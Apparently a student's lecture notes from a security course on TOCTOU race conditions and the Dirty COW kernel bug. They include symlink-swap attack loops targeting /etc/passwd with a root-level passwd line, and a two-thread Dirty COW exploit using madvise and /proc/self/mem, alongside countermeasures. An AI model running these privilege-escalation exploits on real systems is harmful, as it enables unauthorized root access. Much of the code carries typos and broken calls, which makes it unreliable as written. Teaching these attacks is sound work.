# Week 3 Race Condition Attacks and Dirty Cow
## Directory
- [Home](/README.md#table-of-contents)
- [Week 2 Buffer-Overflow Attacks and Countermeasures](/week2/README.md#Week-2-buffer-overflow-attacks-and-countermeasures)
- **&rarr;[Week 3 Race Condition Attacks and "Dirty Cow"](/week3/README.md#Week-3-race-condition-attacks-and-dirty-cow)**
- [Week 4 Format String Attack and Shellshot Attack](/week4/README.md#week-4-format-string-attack-and-shellshock-attack)

## 3.2 Part 1: Race Condition Attack
([top](#top))

- related to multiple processes

## 3.3 Race Condition Vulnerability

```bash
function widthdraw{
    $balance = getBalance();
    if($amount <= $balance){
        $balance = $balance - $amount;
        echo "you have withdrawn: $amount";
        saveBalance($balance);
    } else {
        echo "insufficient funds";
    }
}
```
User can launch two transactions simultaneously


```c
//access is a set-uid program
if(!access("/tmp/X",W_OK)){ //(1)
    // real user id has access right
    f=open("/tmp/X",O_WRITE); //(2)
    write_to_file(f);
}else{
    // real user id does not have access rights
    fprintf(stderr, "permission denied\n");
}
```
**assumption - this program executes one line per minut**
- if time between (1) and (2) is long, we can create a symbolic link between /tmp/x and /etc/password, then we can write to file.
- attacker will run this program in a loop
  - target and attack


### another vulnerable program
```c
fiel = "/tmp/X";
fileExist = check_file_existence(file);
if(fileExist==FALSE){
    // the file does not exist, create it
    f=open(file, O_CREAT);
    //write to file
}
```
- time of check to time of use
  - toctou



```C
if(!access("/etc/shadow",W_OK){
    f=fopen("/etc/shadow", O_WRITE);
    write_to_file(f);
}else{
    fprintf(stderr,"ermission denied");
}
```
no vulnerability in the program because we check the shadow file so real userid will not be able to open it.

## 3.4 How to Attack in Practice
([top](#top))

### How to Attack

```C
{
    char * fn = "/tmp/XYZ";
    char buffer[60];
    FILE *fp;

    // get user input
    scanf("%50s",buffer);

    if(!access(fn,W_OK)){    // action A
        fp = fopen(fn,"a+"); // action B
        fwrite("\n",sizeof(char),1,fp);
        fwrite(buffer,sizeof(char),strlen(buffer),fp);
        fclose(fp);
    }
    else{
        printf("no permission\n");
    }
}
```

want to write this to `/etc/password` using race condition
```
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
```

### Attacking Script

```bash
#!/bin/sh

while :
do
    ./vulp < passwd_input
done
```

### Run the attack program

```C
#include <uistd.h>

int main(){
    while(1){
        //Action C
        unlink("/tmp/XYZ");
        symlink("/home/seed/myfile","/tmp/XYZ");
        usleep(10000);
        
        //Action D
        unlink("/tmp/XYZ");
        symlink("/etc/password","/tmp/XYZ");
        usleep(10000);
    }
    return 0;
}
```

- we want the process execution to be 
  - C,A,D,B

### monitor the result

```bash
#!/bin/sh

old='ls -l /etc/passwd'
new='ls -l /etc/passwd'
while [ "$old" = "$new" ]
do
    ./vulp<passwd_input
    new='ls -l etcpasswd'
done
echo "STOP... the passwd file hass been changed"
```

## 3.5 Countermeasures
([top](#top))

### Locking the File

- file locks under Unix are by default **advisory**. This means that cooperating processes may use locks to coordinate access to a file among themselves, but uncooperative processes are also free to ignore locks and access the file in any way they choose.

### Make Operation Atomic


```c
file = "/tmp/X";
fileExist = check_file_existence(file);
if (fileExist == FALSE){
    //the file does not exist, create it
    f = open(file, O_CREAT);
}
```

when opening the file use
```C
open(file,O_CREAT|O_EXCL);
```
`O_EXCL` file exists, fail
really good


can we check access?
```C
open(file, O_WRITE|O_REAL_USER_ID);
```
`O_REAL_USER_ID` does not exist yet, so we still have to do it in two steps

### Check-Use-Repeat Approach

```C
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>

int main(){
    struct stat stat1, stat2, stat3;
    int fd1, fd2, fd3;

    // three toctou windows:
    if(access("tmp/XYZ",O_RDWR)){  //race 1
        fprintf(stderr, "permission denied\n");
        return -1
    }else fd1=open("/tmp/XYZ",O_RDWR);//race 2

    if(access("tmp/XYZ",O_RDWR)){//race 3
        fprintf(stderr, "permission denied\n")
        return -1
    }else fd2=open("/tmp/XYZ",O_RDWR);//race 4

    if(access("tmp/XYZ",O_RDWR)){//race 5
        fprintf(stderr, "permission denied\n");
        return -1
    }else fd3=open("/tmp/XYZ",O_RDWR);

    // check whether f1, f2, f3 hve the same i-node (using fstat)
    fstat(fd1, &stat1);
    fstat(fd2, &stat2);
    fstat(fd3, &stat3);

    if(fstat.st_ino == stat2.st_ino && stat2.st_ino == stat3.st_ino) {
        // all 3 i-nodes are the same
        write_to_file(fd1);
    }else{
        fprintf(stderr,"race condition detected\n");
        return -1;
    }
    return 0;
}
```

### Ubuntu's Sticky Link Protection
#### Turn on the protection

```
$ sudo sysctl -w kernel.yama.protected_sticky_symlinks=1
```

#### What the protection means

```C
int main(){
    char *fn = "/tmp/XYZ";
    FILE *fp;

    fp = fopen(fn, "r");
    if(fp==NULL){
        printf("fopen() call failed \n");
        printf("reason: %s\n", strerror(errno));
    }
    else{
        printf("fopen() call succeeded \n");
    }
    fclose(fp);
    return 0;
}
```

More of a patch than a fundamental security solution. Prevents certain files from having their symbolic link changed. Not a true security solution but prevents the attacks we have discussed above.

## 3.6 Least-Privilege Principle
([top](#directory))

```C
// disable the root privilege

uid_t real_uid = getuid();
uid_t effective_uid = geteuid();

seteuid(real_uid); //set less privilege, not root user

f=open("/tmp/X",O_WRITE); //open file as normal user
if(f!=-1)
    write_to_file(f); //write file as normal user
else
    fprintf(stderr,"Permission denied\n");

// if needed enable the root privilege
seteuid(effective_uid); //turn on root privilege again
```

### Question
> We are thinking about using the least-privilege principle to defend against the buffer-overflow attack. Namely, before executing the vulnerable function, we disable the root privilege; after the vulnerable function returns, we enable the privilege back. Does this work? Why or why not?

In the buffer overflow lab we used the shell code to set the uid so we could run the shell as root privilege. Does the callback function need to have elevated privilege to run? can normal user set the uid in shell code?

- race condition
  - no malicious code is run
- buffer overflow
  - attack runs malicious code
  - uid not relevant

## 3.7 Summary
([top](#top))

- Race conditions vulnerability
- How to exploit race condition vulnerabilities
- Defending against race condition attacks

## 3.8 Part 2: "Dirty COW" Vulnerability
([top](#top))

### What is Dirty COW?

- a case of race condition vulnerability
- affected al linux-based operating systems, including android
- existed since 2007, exploited in 2016
- COW = "copy on write"

## 3.9 Map File to Memory
([top](#top))

```C
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>

int main(){
    struct stat st;
    char content[10];
    char *new_content = "New Content";
    void *map;

    int f=open("./zzz",ORDWR);
    fstat(f,&st);
    // map the file to memroy
    map=mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, f, 0);

    // read memory from the file via the mapped memory
    memcpy((void *)content, map, 10);
    printf("read: %s\n", content);

    //write to the file via the mapped memory
    memcpy(map, new_content, strlen(new_content));

    // clean up 
    munmap(map, st.st_size);
    close(f);
    return 0;
}
```

```
mmap(
    starting address,
    size of memory, 
    read/write (needs to match open),
    update visible to pther processes? 
    file descriptor
    offset 
    )
```

### MAP_SHARED vs MAP_PRIVATE

#### MAP_SHARED

|p1|physical memory|p2|
|-|-|-|
|file|||
|&#8627;|file|&#8624;|
|||file|

#### MAP_PRIVATE

|p1 vm|physical memory|p2 vm|
|-|-|-|
|p1|||
|&#8627;|file|&#8624;(1 before write)|
||&darr;copy|p2|
||file copy|&#8626;(2 after write)|

#### Discard the copied memory

```c
int madvise(void *addr, size_t length, int advice);
```

### Map a read-only file and write to it

```C
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>

int main(int argc, char *argv[]){
    char *content="new content";
    char buffer[30];
    struct stat st;
    void *map;

    int f=open("/zzz",O_RDONLY);
    fstat(f,&st);
    map=map(NULL,st.st_size, PROT_READ,MAP_PRIVATE,f,0);

    //open the prcoess's memory pseudo-file
    int fm=open("/proc/sef/mem",O_RDWR);

    //start at the 5th byte form the beginning
    lseek(fm, (off_t) map+5, SEEK_SET);

    //write to the memory
    write(fm, content, strlen(content));

    //check whether the write is successful
    memcpy(buffer, map, 29);
    printf("Content after write: %s\n", buffer);

    //check the content after madvise
    madvise(map, st.st_size,MADV_DONTNEED);
    memcpy(buffer, map, 29);
    printf("content after madvise: %s\n",buffer);

    return 0;
}
```

## 3.10 The Dirty COW Race Condition
([top](#top))

- `MAP_PRIVATE` to readonly file

|p1 vm|physical memory|virtual memory|
|-|-|-|
||||
||read only file|&#8624;(1 before write)|
||&darr;copy|p2|
||file copy|&#8626;(2 after write)|

- use `write()` to write to file
    a) make a copy of memory (1)
    b) change the mapping to (2)
    c) write to the memory
    d) `madvise()` discard copy
        - what if we `madvise` before writing to memory??
        - move pointer to (1) before;

abc d, abc d
what if
ab d c, ab d c

to attack we use two threads to loop `write()` and `madvise()`

## 3.11 Exploit the Vulnerability
([top](#top))

### The Main Thread

```C
int main (int argc, char *argv[]){
    pthread_t pth1, pth2;
    struct stat st;

    // open the file in read only mode
    int f = open("/zzz",O_RDONLY);

    // open with PROT_READ
    fstat(f,&st);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);

    // we ave to do the attack using two threads
    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, TARGET_CONTENT);

    // wait for the threads to finish
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}
```

### The advise thread

```C
void *map

void *madviseThread(void *arg)
{
    while(1){
        madvise(map, 100, MADV_DONTNEED);
    }
}

void *procselfmemThread(void *arg)
{
    char *content=(char*) arg;
    char current_content[10];

    int f=open("/proc/self/mem", O_RDWR);
    while(1){
        //set the file pointer to the OFFSET from the beginning
        lseek(f,(uintptr_t) map+OFFSET, SEEK_SET);
        write(f, content, strlen(content));
    }
}
```

### Header File
```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

#define OFFSET 10;
#define TARGET_CONTENT "The attack is successful!!"

```

in `/etc/passwd` we can change the normal user id to root, `0000`

## 3.12 Dirty COW Demo
([top](#top))

## 3.13 Summary
([top](#top))

- memory mapping and its race condition vulnerability
- how the Diry COW attack works
